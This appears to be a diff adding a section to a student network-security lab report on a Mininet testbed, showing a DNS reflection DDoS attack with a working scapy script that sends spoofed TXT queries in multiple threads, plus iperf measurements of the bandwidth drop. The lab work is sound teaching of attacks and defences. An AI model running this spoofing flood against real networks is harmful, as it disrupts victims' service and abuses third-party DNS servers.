@@ -300,3 +300,64 @@ table inet r2 {
 }
 ```
 
+
+## Reflection attack
+
+### attack
+
+We proceeded with DDoS by DNS reflection attack. This attack consists of spooging attacker's IP address and sending a big amount of requests to one or multiple DNS servers on behalf of the victim.
+This technique allows us to multiply the bandwidth of the attack to perform a more powerful attack with less bandwidth.
+To perform this attack, we edited `dnsmasq.conf` to add a big number of TXT records to the domain name `this-is-the-rather-long-domain-name.example.com`. In this case there is only one DNS server, but we can suppose that the local enterprise 
+
+In the beginning we also wanted to perform an [https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/](NTP reflection) attack, but for some reason (we didn't investigate any further onto why), the NTP server doesn't respond to `monlist` command. This command is probably just disabled. Other NTP commands don't allow to perform a significant amplification, so we just sticked with standard DNS reflection.
+
+```python
+from scapy.all import *
+import threading
+import time
+
+domain = "this-is-the-rather-long-domain-name.example.com"
+dns_server = "10.12.0.20"
+port = 5353
+target_server = "10.1.0.2" # ws2
+
+dns_request = IP(dst=dns_server, src=target_server) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname=domain, qtype='TXT'))
+
+def send_dns_request(end_time):
+    while time.time() < end_time:
+        response = send(dns_request, verbose=0, count=1000)
+
+num_threads = 10
+duration = 30  # Duration in seconds
+
+end_time = time.time() + duration
+
+threads = []
+for _ in range(num_threads):
+    thread = threading.Thread(target=send_dns_request, args=(end_time,))
+    thread.start()
+    threads.append(thread)
+
+for thread in threads:
+    thread.join()
+```
+
+The attack is performed during 30 seconds. We can observe that the attack uses up 3Gbit/s of bandwidth on average with one DNS server as reflector.
+
+Normal performance:
+```
+mininet> iperf ws2 dns
+*** Iperf: testing TCP bandwidth between ws2 and dns
+*** Results: ['6.31 Gbits/sec', '6.32 Gbits/sec']
+```
+
+Bandwidth during DNS reflection attack
+```
+mininet> internet python /home/mininet/LINFO2347/attacks/03_ddos.py &
+mininet> iperf ws2 dns
+*** Iperf: testing TCP bandwidth between ws2 and dns
+*** Results: ['3.26 Gbits/sec', '3.27 Gbits/sec']
+```
+
+
+
